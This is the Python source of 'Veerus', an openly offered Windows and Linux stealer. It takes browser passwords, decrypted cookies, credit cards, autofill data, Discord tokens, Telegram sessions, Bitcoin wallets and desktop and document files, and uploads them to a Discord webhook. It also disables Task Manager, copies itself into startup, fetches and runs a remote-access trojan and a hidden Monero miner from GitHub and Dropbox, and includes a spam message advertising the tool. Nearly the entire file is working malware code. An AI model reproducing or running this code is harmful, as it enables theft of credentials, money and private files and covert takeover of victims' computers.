import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir, walk
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import discord
import win32crypt
import shutil
import command
import random
import threading
import re
import wmi
import uuid
import textwrap
import psutil
import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from json import loads
from regex import findall
import platform
import time
from pathlib import Path
import codecs
import pyImpossibleObf
import json
import base64
from addict import Dict
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import winreg as reg
import winreg
from anonfile import AnonFile
import getpass
import zipfile
import win32clipboard
USER_NAME = getpass.getuser()



"""

	globals :

"""

#WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
Bot_Token = "BotTokenForTheRat667"


WEBHOOK = "webhook667"
webhook = WEBHOOK
ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
dm_all = True
DMALLMSG = """:flag_gb: Hello !
Your friend just got pwn'd by 0xSxZ/Veerus you wan't to do the same?
Let me explain what you can do with Veerus :
```Stealer :
	Chromium (Opera, Opera Gx, Chrome, Brave, 360Browser, etc...) : 
		Passwords, Credit Cards, Cookies, Autofill
	Discord :
		Token
	Miner :		
		Hidden XMR Miner
	Other :
		Add to computer startup the number of time you choosed.
		Clone the virus in random directories
		Undetected by Windows Defender & Windows Smart screen
		Anti Virtual Machine
		Disable Task Manager```
	Price : 0.00$ ! yes ! Totally Free !
	Links :
		Discord : https://discord.gg/7GkfBzRQXX
		Github : https://github.com/0xSxZ/Veerus"""
mdmbot = discord.Client()
STATSWEBHOOK = "NoWebhook667EKIP"
STATSAPI = [
	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
	"https://api.nanopool.org/v1/xmr/balance/" + str(ADDRESS)
]


os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")

REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"




WALLETCOUNT = 0
CURRENCYPWNUM = 0
CREDITCARDSNUM = 0
CURRENCYCOOKIESNUM = 0
COOKIESNUM = 0
PASSWORDNUM = 0

CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]

PROCESS_PATHS = [
	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
]
PROCESS_NUM = processnumbers

MINE = True #Mine crypto? True/False
MINING_PERCENT = "30"
CUDA = True


computer = wmi.WMI()
RATURL = "https://github.com/0xSxZ/Veerus/releases/download/dont/r4t.exe"
MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
GPUMODEL = computer.Win32_VideoController()[0]
rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svck.exe"
XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"

APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


Founded = False
res =  """Stealed By 0xSxZ ------------> \n\n"""
creditcard = "=========Stealed by 0xSxZ =============\n\n"
currency = "=========Stealed by 0xSxZ =============\n\n"
currencyCookies = "=========Stealed by 0xSxZ =============\n\n"
local_appdata = os.environ['LOCALAPPDATA'] + "\\"
default_appdata = os.getenv('APPDATA')


walletspath = [
	default_appdata + "\\Bitcoin"
]


chromiumpaths = [
	default_appdata + "\\Opera Software\\Opera Stable",
	default_appdata + "\\Opera Software\\Opera GX Stable",
	local_appdata + "Google\\Chrome",
	local_appdata + "Google(x86)\\Chrome",
	local_appdata + "Chromium",
	local_appdata + "BraveSoftware\\Brave-Browser",
	local_appdata + "Epic Privacy Browser",
	local_appdata + "Amigo",
	local_appdata + "Vivaldi",
	local_appdata + "Orbitum",
	local_appdata + "Mail.Ru\\Atom",
	local_appdata + "Kometa",
	local_appdata + "Comodo\\Dragon",
	local_appdata + "Torch",
	local_appdata + "Comodo",
	local_appdata + "Slimjet",
	local_appdata + "360Browser\\Browser",
	local_appdata + "Maxthon3",
	local_appdata + "K-Melon",
	local_appdata + "Sputnik\\Sputnik",
	local_appdata + "Nichrome",
	local_appdata + "CocCoc\\Browser",
	local_appdata + "uCozMedia\\Uran",
	local_appdata + "Chromodo",
	local_appdata + "Yandex\\YandexBrowser"
]


yes = "yes"

if yes == "yes":
	def rat_thread():
		os.system(rat_path + " " + Bot_Token)
	def stealBitcoinCore():
		global WALLETCOUNT
		try:
			btcUuid = str(uuid.uuid4())
			shutil.make_archive(btcUuid, 'zip', walletspath[0] + "\\wallets")
			WALLETCOUNT = WALLETCOUNT + 1
			return btcUuid + ".zip"
		except:
			return "No wallets"
	TLGSESSIONS = 0
	def stealTLG():
		global TLGSESSIONS
		btcUuid = str(uuid.uuid4())
		shutil.make_archive(btcUuid, 'zip', default_appdata + "\\Telegram Desktop\\tdata")
		TLGSESSIONS = TLGSESSIONS + 1
		return btcUuid + ".zip"



	def GetClipboardData():
		win32clipboard.OpenClipboard()
		data = win32clipboard.GetClipboardData()
		win32clipboard.CloseClipboard()
		return data
	def ClearTerm():
		if(os.name == "nt" or os.name == "windows"):
			os.system("cls")
		else:
			os.system("clear")
	def antiAnalysis():
		while True:
			ClearTerm()
			time.sleep(0.1)
	#threading.Thread(target=antiAnalysis).start()
	def valid_uuid(uuid):
		 regex = re.compile('^[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}\Z', re.I)
		 match = regex.match(uuid)
		 return bool(match)
	def launchProcesses(path):
		try:
			os.system(path)
		except Exception as e:
			print("Err : "+ str(e))

	try:
		url = 'http://ipinfo.io/json'
		response = requests.get(url)
		data = response.json()
		IP=data['ip']
		org=data['org']
		city = data['city']
		country=data['country']
		region=data['region']
	except:
		IP = str(uuid.uuid4())
		city = str(uuid.uuid4())
		country = str(uuid.uuid4())
	def add_to_startup(file_path):
		copyof_file = str(uuid.uuid4()) 
		#os.system("mkdir " + local_appdata + copyof_file)
		copyof_file = file_path
		shutil.copy(os.path.realpath(sys.argv[0]), copyof_file)
		print(copyof_file)
		if file_path == "":
			file_path = copyof_file
		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
		with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
			bat_file.write(r'start "" "%s"' % file_path)
	if(platform.system() == 'windows' or platform.system() == "Windows"):
		numberOfClones = 0
		for i in range(PROCESS_NUM):
			try:
				original = os.path.basename(sys.argv[0])
				#folderName = str(uuid.uuid4())
				PROCCESS_PATH = random.choice(PROCESS_PATHS)
				os.mkdir(PROCCESS_PATH)
				rdmchoice = str(uuid.uuid4())
				target = PROCCESS_PATH + "\\" + rdmchoice+ ".exe"
				print(target)
				add_to_startup(target)
			except:
				continue
	def checkIfProcessRunning(processName):
		'''
		Check if there is any running process that contains the given name processName.
		'''
		#Iterate over the all the running process
		for proc in psutil.process_iter():
			try:
				# Check if process name contains the given name string.
				if processName.lower() in proc.name().lower():
					return True
			except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
				pass
		return False;
	print("Running : "  + str(checkIfProcessRunning("xmrig")))
	def stealChromeWin():
		try:
			global currency
			res =  """Stealed By 0xSxZ ------------> \n\n"""
			creditcard = "=========Stealed by 0xSxZ =============\n\n"
			try:
				ibm = 0
				for i in range(len(chromiumpaths)):
					if not os.path.exists(chromiumpaths[i]):
						continue
					path = str(chromiumpaths[i] + "\\User Data\\"+"\\Default\\Web Data")
					if not os.path.exists(path):
						path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 1\\Web Data")
						if not os.path.exists(path):
							path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 2\\Web Data")
							if not os.path.exists(path):
								continue
					shutil.copy(path, "webdata.db")
					path = "webdata.db"
					db = sqlite3.connect(path)
					connection = sqlite3.connect(str(path))
					cursor = db.cursor()
					cursor.execute("SELECT  name, value FROM 'autofill'")
					for name, value in cursor.fetchall():
						res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
						if("card" in value or "credit" in value):
							creditcard = creditcard + res
						if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
							currency = currency + res
						ibm = ibm + 1
						
						if(ibm >= 370):
							break
					connection.close()
					if(ibm >= 370):
						break
				Founded = True
				return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
			except Exception as e:
				print(e)
		except Exception as e:
				print(e)
	def stealChromeWinHistory():
		try:
			path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
			connection = sqlite3.connect(str(path))
			chromewinhist = str( tuple(connection.execute("SELECT url FROM 'urls'")))
			connection.close()
			return chromewinhist.replace("(", '\n').replace(")", "\r\n")
		except Exception as e:
			return "[.] Error"
	"""
		credits : 
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc

	"""
	def get_master_key(path):
		with open(path, "r", encoding='utf-8') as f:
			local_state = f.read()
			local_state = json.loads(local_state)
		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]  # removing DPAPI
		master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
		return master_key


	def decrypt_payload(cipher, payload):
		return cipher.decrypt(payload)


	def generate_cipher(aes_key, iv):
		return AES.new(aes_key, AES.MODE_GCM, iv)


	def decrypt_password(buff, master_key):
		try:
			iv = buff[3:15]
			payload = buff[15:]
			cipher = generate_cipher(master_key, iv)
			decrypted_pass = decrypt_payload(cipher, payload)
			decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
			return decrypted_pass
		except Exception as e:
			# print("Probably saved password from Chrome version older than v80\n")
			# print(str(e))
			return "Chrome < 80"

	def chromeCookies():
		try:
			global COOKIESNUM
			global currencyCookies
			global CURRENCYCOOKIESNUM
			chrcooks = ""
			for i in range(len(chromiumpaths)):
				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
				if not os.path.exists(db_path):
					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Network\\Cookies"
					if not os.path.exists(db_path):
						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Network\\Cookies"
						if not os.path.exists(db_path):
							db_path = chromiumpaths[i]+ "\\Network\\Cookies"
							if not os.path.exists(db_path):
								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Network\\Cookies"
								if not os.path.exists( str(chromiumpaths[i])+ "\\Network\\Cookies"):
									continue
				local_state_path = chromiumpaths[i]  + "\\Local State"
				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
					if not os.path.isfile(local_state_path):
						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
						if not os.path.isfile(local_state_path):
							continue
					print("Getting Chrome cookies : " + db_path)
					if not os.path.exists(db_path):
						continue
				print("Getting Chrome cookies : " + db_path)
				if not os.path.exists(db_path):
					continue
				
				filename =  str(uuid.uuid4()) + ".db"
				if not os.path.isfile(filename):
					shutil.copy(db_path, filename)
				# connect to the database
				db = sqlite3.connect(filename)
				# ignore decoding errors
				db.text_factory = lambda b: b.decode(errors="ignore")
				cursor = db.cursor()
				# get the cookies from `cookies` table
				cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM 'cookies'""")
				key = get_encryption_key(local_state_path)
				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
					decrypted_value = decrypt_password(encrypted_value, key)
					chrcooks = chrcooks + f"""
					Host: {host_key}
					Cookie name: {name}
					Cookie value (decrypted): {decrypted_value}
					===============================================================
					"""
					COOKIESNUM = COOKIESNUM + 1
					if("wallet" in host_key or "paypal" in host_key or "payeer" in host_key or "coinbase" in host_key or "binance" in host_key):
						CURRENCYCOOKIESNUM = CURRENCYCOOKIESNUM + 1
						#print(host_key)
						currencyCookies = currencyCookies + f"""\n\n
						COOKIE : 
						Host: {host_key}
						Cookie name: {name}
						Cookie value (decrypted): {decrypted_value}
						===============================================================
					\n\n"""
					# update the cookies table with the decrypted value
					# and make session cookie persistent
					cursor.execute("""
					UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
					WHERE host_key = ?
					AND name = ?""", (decrypted_value, host_key, name))
				# commit changes
				db.commit()
				# close connection
				db.close()

			return chrcooks
		except Exception as e:
			print(e)

	def main():
		global currency
		global PASSWORDNUM
		global CURRENCYPWNUM
		binks = "==============Stealed By 0xSxZ=============="
		for i in range(len(chromiumpaths)):
			db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
			if not os.path.exists(db_path):
				db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
				if not os.path.exists(db_path):
					db_path = chromiumpaths[i]+ "\\Login Data"
					if not os.path.exists(db_path):
						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Login Data"
						if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
							continue
			print("Existing")
			local_state_path = chromiumpaths[i]  + "\\Local State"
			if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
				local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
				if not os.path.isfile(local_state_path):
					local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
					if not os.path.isfile(local_state_path):
						print("no Local state")
						continue
			master_key = get_master_key(local_state_path)
			login_db = db_path
			dbpath = str(uuid.uuid4())
			print("667")
			shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
			conn = sqlite3.connect(dbpath)
			cursor = conn.cursor()
			cursor.execute("SELECT action_url, username_value, password_value FROM logins")
			for r in cursor.fetchall():
				url = r[0]
				username = r[1]
				encrypted_password = r[2]
				decrypted_password = decrypt_password(encrypted_password, master_key)
				binks = binks + (f"Main URL: {url}\n")
				binks = binks +(f"User name: {username}\n")
				binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
				PASSWORDNUM = PASSWORDNUM + 1
				print("Number : " + str(PASSWORDNUM))
				if("billing" in url or "wallet" in url or "finance" in url or "paypal" in url or "payeer" in url or "coinbase" in url or "binance" in url or "bank" in url):
					CURRENCYPWNUM = CURRENCYPWNUM + 1
					currency = currency + (f"\n\nMain URL: {url}\n")
					currency = currency +(f"User name: {username}\n")
					currency = currency +(f"Decrypted Password: {decrypted_password}\n\n")
					currency = currency + ("=" * 100)
			cursor.close()
			conn.close()

		return binks
	def PasswLinux():
		try:
			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
			FirefoxPath2 = os.listdir(FirefoxPath)
			FirefoxLength = len(FirefoxPath2)
			for i in range(FirefoxLength):
				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
					if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
						db = FirefoxPath + FirefoxPath2[i] + "/key3.db"
					else:
						db = FirefoxPath + FirefoxPath2[i] + "/key4.db"
					passwordF = FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"/logins.json", db)
					return("""
	-------------------------
	Veerus by 0xSz
	Password stealed
	------------------------\n
	""" + str(passwordF)+"\n\n------------------------")
					break
				else:
					print("False")
		except Exception as e:
			return "Error  or no passwords. : " + str(e)



	"""

		credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py

	"""

	tokens = []
	cleaned = []

	def decrypt(buff, master_key):
		try:
			return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
		except Exception as e:
			return "An error has occured.\n" + e
	askUser = "2"
	def getDisk0rdToken():
		if "2" in askUser:

			with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local State", "r") as file:
				key = loads(file.read())['os_crypt']['encrypted_key']
				file.close()
			for file in listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\"):
				if not file.endswith(".ldb") and file.endswith(".log"):
					continue
				else:
					try:
						with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
							for x in files.readlines():
								x.strip()
								for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
									tokens.append(values)
									
					except PermissionError:
						continue
			for i in tokens:
				if i.endswith("\\"):
					i.replace("\\", "")
				elif i not in cleaned:
					cleaned.append(i)
			tosend = ""
			for token in cleaned:
				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode())  +" " + "\n" 
			return tosend
	"""

		^^^^^credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py^^^^^

	"""
	def PasswWin():
		print("[.] Getting Win Firefow pw's")
		try:
			if os.name == 'nt' or os.name == 'windows':	

				passwordF = ""
				FirefoxPath = str(os.getenv('APPDATA')) + "\\Mozilla\\Firefox\\Profiles\\"
				FirefoxPath2 = os.listdir(FirefoxPath)
				FirefoxLength = len(FirefoxPath2)
				for i in range(FirefoxLength):
					if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "\\key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
						if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
							db = FirefoxPath + FirefoxPath2[i] + "\\key3.db"
						else:
							db = FirefoxPath + FirefoxPath2[i] + "\\key4.db"
						passwordF = passwordF + str(FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"\\logins.json", db))
					else:
						print("False")
				return ("""
		-------------------------
		Veerus by 0xSz (on github)
		Password stealed
		------------------------\n
		""" + str(passwordF) +"\n\n------------------------")
						

			else:
				return b"OS not supported."
		except Exception as e:
			return "Error : " + str(e)
	def get_chrome_datetime(chromedate):
		"""Return a `datetime.datetime` object from a chrome format datetime
		Since `chromedate` is formatted as the number of microseconds since January, 1601"""
		return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

	def get_encryption_key(path):

		local_state_path = path
		with open(local_state_path, "r", encoding="utf-8") as f:
			local_state = f.read()
			local_state = json.loads(local_state)

		# decode the encryption key from Base64
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		# remove DPAPI str
		key = key[5:]
		# return decrypted key that was originally encrypted
		# using a session key derived from current user's logon credentials
		# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

	def decrypt_password(password, key):
		try:
			# get the initialization vector
			iv = password[3:15]
			password = password[15:]
			# generate cipher
			cipher = AES.new(key, AES.MODE_GCM, iv)
			# decrypt password
			return cipher.decrypt(password)[:-16].decode()
		except:
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				# not supported
				return ""
	def getccs():
		global CREDITCARDSNUM
		binks = "==============Stealed By 0xSxZ=============="
		try:
			ccss = ("=" * 100)
			for i in range(len(chromiumpaths)):
				db_path = str(chromiumpaths[i])+ "\\Web Data"
				if not os.path.exists(db_path):
					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Web Data"
					if not os.path.exists(db_path):
						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1" +"\\Web Data"
						if not os.path.exists(db_path):
							db_path = chromiumpaths[i]+ "\\Login Data"
							if not os.path.exists(db_path):
								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Web Data"
								if not os.path.exists( str(chromiumpaths[i])+ "\\Web Data"):
									continue
				local_state_path = chromiumpaths[i]  + "\\Local State"
				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
					if not os.path.isfile(local_state_path):
						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
						if not os.path.isfile(local_state_path):
							continue
				master_key = get_master_key(local_state_path)
				login_db = db_path
				dbpath = str(uuid.uuid4())
				shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
				conn = sqlite3.connect(dbpath)
				cursor = conn.cursor()
				try:
					cursor.execute("SELECT * FROM 'credit_cards'")
					for r in cursor.fetchall():
						CREDITCARDSNUM = CREDITCARDSNUM + 1
						action_url = r[1]
						username = r[2]
						password = r[3]
						encrypted_password = r[4]
						date_created = decrypt_password(encrypted_password, master_key)
						print(date_created)
						ccss =ccss + "\nName on card : " + str(action_url)
						ccss =ccss +"\nEXP_Month : "+ str(username)
						ccss =ccss +"\nEXP_Year: " + str(password)
						ccss =ccss +"\nCard Num: " + str(date_created)
						ccss = ccss + ("=" * 100)
						print(ccss)
					cursor.close()
					conn.close()
				except Exception as e:
					print(e)
				try:
					os.remove(dbpath)
				except Exception as e:
					pass


				try:
					  
					# trying to remove the copied db file as 
					# well from local computer
					os.remove(filename)
				except:
					pass
		except ZeroDivisionError as e:
	  		print(str(e))
		return ccss


	def getfiles():
		desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop') 
		path = desktop + r'/**/*.txt'
		files = glob.glob(path, recursive=True)
		path = desktop + r'/**/*.pdf'
		files.extend(glob.glob(path, recursive=True))
		path = desktop + r'/**/*.doc'
		files.extend(glob.glob(path, recursive=True))
		with zipfile.ZipFile('desktop.zip', 'w') as zipF:
			for file in files:
				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
		desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Documents') 
		path = desktop + r'/**/*.txt'
		files = glob.glob(path, recursive=True)
		path = desktop + r'/**/*.pdf'
		files.extend(glob.glob(path, recursive=True))
		path = desktop + r'/**/*.doc'
		files.extend(glob.glob(path, recursive=True))
		with zipfile.ZipFile('Documents.zip', 'w') as zipF:
			for file in files:
				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
	def MineThreadWin():
		XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
		print("[.] Starting miner if enabled.")
		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --threads=4 --background')
	def MineThreadLinux():
		print("[.] Starting miner if enabled.")
		try:
			os.system("./apt.bb -o xmr-eu1.nanopool.org:14444 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
		except:
			os.system("./apt.bb -o xmr-eu1.nanopool.org:14444 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
	def connectOption():
		if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
			print("Not windows...")
			try:
				os.system("mkdir /opt/0xSz/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/aptEssentials/")
				os.chdir("/opt/0xSz/update/aptEssentials/")
				os.system("apt install wget")
				os.system("wget https://www.dropbox.com/s/kebdpffh42q7e7z/apt?dl=1 -O /opt/0xSz/update/aptEssentials/apt.bb")
				os.system("chmod +x ./apt.bb")
				#threading.Thread(target=MineThreadLinux).start()
				time.sleep(2)
			except Exception as e :
				print(str(e))
			if MINE == True and checkIfProcessRunning("xmrig") == False:
				threading.Thread(target=MineThreadLinux).start()
				print("[.] Executing miner..")
		else:
			try:
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
				XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svckho.exe"
				rat_path = os.getenv('APPDATA') + "\\winedows_companny\\update\\Svck.exe"
				r = requests.get(MINERURL)
				with open(XMRIGPATH, 'wb') as f:
					print("Writing..")
					f.write(r.content)
				r = requests.get(RATURL)
				with open(rat_path, 'wb') as f:
					print("Writing..")
					f.write(r.content)
					threading.Thread(target=rat_thread).start()
			except Exception as e:
				print(e)
		if MINE == True and checkIfProcessRunning("xmrig") == False:
			threading.Thread(target=MineThreadWin).start()
			print("[.] Executing miner..")
	def json_extract(obj, key):
		"""Recursively fetch values from nested JSON."""
		arr = []

		def extract(obj, arr, key):
			"""Recursively search for values of key in JSON tree."""
			if isinstance(obj, dict):
				for k, v in obj.items():
					if isinstance(v, (dict, list)):
						extract(v, arr, key)
					elif k == key:
						arr.append(v)
			elif isinstance(obj, list):
				for item in obj:
					extract(item, arr, key)
			return arr

		values = extract(obj, arr, key)
		return values


	def minerstats():
		if(STATSWEBHOOK != "NoWebhook"):
			hashrate = ""
			balanceXMR = ""
			Aproximate = ""
			avgHASHRATE = ""
			webhook = DiscordWebhook(url=STATSWEBHOOK, username="STATS : github.com/0xSxZ/Veerus/")
			for i in range(len(STATSAPI)):
				r = requests.get(STATSAPI[i])
				result = r.json()["data"]
				print(result)
				if("/hashrate/" in STATSAPI[i]):
					result = r.json()
					h1 = result["data"]
					hashrate = str(h1).replace("[", "").replace("]","")
					print("Hashrate : "+hashrate)
					if(hashrate == "0"):
						hashrate = "1"
					try:
						r2 = requests.get("https://api.nanopool.org/v1/xmr/approximated_earnings/" + str(hashrate))
						rdjson = Dict(r2.json())
						
						Aproximate = rdjson["data"]["month"]["dollars"]
						print("Aproximate : " + str(Aproximate))
					except Exception as e:
						Aproximate = "Error while getting Aproximation"
				elif("balance" in STATSAPI[i]):
					balanceXMR = result
				elif("avghashrate" in STATSAPI[i]):
					avgHASHRATE  = r.json()["data"]
			embed = DiscordEmbed(title='Stats :', description=f':chart: Stats of miner : \n\n:bar_chart: Hashrate : {hashrate}\n:chart_with_upwards_trend: AVG hashrate (h = hour) : {avgHASHRATE}\n:moneybag: Balance : {balanceXMR}\n:chart_with_upwards_trend: Aproximative Earning (month) : {str(Aproximate)[:6]}$\n:robot: Sent from : {GPUMODEL.Caption}\n:clock1: Sending again in 3 minutes..', color='03b2f8')
			webhook.add_embed(embed)
			webhook.execute()
			time.sleep(180)
	import sys # only lib needed

	def get_base_prefix_compat(): # define all of the checks
		return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

	def in_virtualenv(): 
		return get_base_prefix_compat() != sys.prefix

	if in_virtualenv() == True: # if we are in a vm
		sys.exit() # exit
	if(WEBHOOK != "" and WEBHOOK != None):
		print("[.] Sending")
		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
		webhook.add_embed(embed)
		
		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
		pwdd =main()
		ccs = getccs()
		cooky = chromeCookies()
		print(ccs)
		webhook.add_file(file=ccs, filename="Credit Cards.txt")
		webhook.add_file(file=str(pwdd), filename="Passwords.txt")
		webhook.add_file(file=str(cooky), filename="Cookies.txt")
		try:
			autofill = stealChromeWin()
			autfill = str(autofill).split(":::667")
			print(autfill[1])
		except:
			autfill = ["dazdaz", "dazdza", "dazdhjnza"]
		webhook.add_file(file=autfill[0], filename="Autofills.txt")

		
		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="History.txt")
		webhook.add_file(file=currency, filename="Currency Passwords.txt")
		webhook.add_file(file=currencyCookies, filename="Currency Cookies.txt")
		webhook.execute()
		connectOption()
		os.system("cd")
		getfiles()
		time.sleep(2)
		print("[.] Sending Desktop")
		btcCore = stealBitcoinCore()
		webhook = DiscordWebhook(url=WEBHOOK, username="github.com/0xSxZ/Veerus/")
		if(btcCore != "No wallets"):
			webhook.add_file(file=open(btcCore, "rb").read(), filename="BtcCoreWallet.zip")
		webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
		webhook.add_file(file=open("Documents.zip", "rb").read(), filename="Documents.zip")
